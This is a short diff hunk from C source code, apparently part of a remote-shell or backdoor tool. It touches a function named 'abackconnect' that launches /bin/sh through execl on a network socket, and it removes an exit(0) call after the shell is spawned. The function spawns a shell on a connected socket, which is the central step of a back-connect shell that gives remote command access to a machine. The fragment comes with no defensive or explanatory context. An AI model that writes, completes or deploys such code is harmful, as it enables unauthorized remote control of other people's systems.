@@ -24,7 +24,6 @@ void abackconnect(int sockfd){
     execl("/bin/sh", "sh", NULL);
     shutdown(sockfd, SHUT_RDWR);
     close(sockfd);
-    exit(0);
 }
 
 int getacceptport(void){
